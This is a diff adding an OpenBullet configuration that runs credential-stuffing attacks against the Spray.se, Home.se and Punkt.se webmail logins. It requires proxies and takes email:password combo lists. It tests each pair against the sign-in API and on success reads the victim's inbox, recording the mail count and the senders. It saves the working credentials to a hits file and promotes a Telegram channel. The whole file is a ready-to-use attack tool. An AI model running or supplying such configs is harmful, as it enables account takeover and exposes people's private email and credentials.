@@ -1,0 +1,77 @@
+[SETTINGS]
+{
+  "Name": "Spray.se",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2023-11-18T14:26:27.2190412+03:30",
+  "AdditionalInfo": "Telegram Channel: t.me/OpenBulletChannel | Work on @Spray.se @Home.se @punkt.se | Capture | Save Hits | CPM Rate: 100-1000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://spray.pangia.biz/app/pageapi.asp" 
+  CONTENT "api=signin&username=<USER>&password=<PASS>&domaincode=spray&RememberMe=&domain=<Domain>&tz=2&ctime=6/13/2023%201%3A32%3A49" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Origin: https://spray.pangia.biz" 
+  HEADER "Referer: https://spray.pangia.biz/app/" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect email or password." 
+  KEYCHAIN Success OR 
+    KEY "FirstName" 
+    KEY "LastName" 
+
+REQUEST GET "https://spray.pangia.biz/mail/ms_ajax.asp?folder=/Inbox&pg=1&msgno=100&sortby=Received&sort_order=DESC&dtTS=full&JSON=yes&filter=&filterFromEmails=" 
+  
+  HEADER "Host: spray.pangia.biz" 
+  HEADER "Referer: https://spray.pangia.biz/app/" 
+  HEADER "sec-ch-ua: \"Not_A Brand\";v=\"99\", \"Google Chrome\";v=\"109\", \"Chromium\";v=\"109\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR "mwcount\": \"" "\"," CreateEmpty=FALSE -> CAP "Total Mails" 
+
+PARSE "<SOURCE>" LR "mw:from\": \"" "\"" Recursive=TRUE CreateEmpty=FALSE -> CAP "Mails" 
+
+#SS UTILITY File "Spray.se Acc.txt" AppendLines "<USER>:<PASS> | Total Mails: <Total Mails> | Mails: <Mails> | Telegram Channel: @OpenBulletChannel" -> VAR "SS" 
+
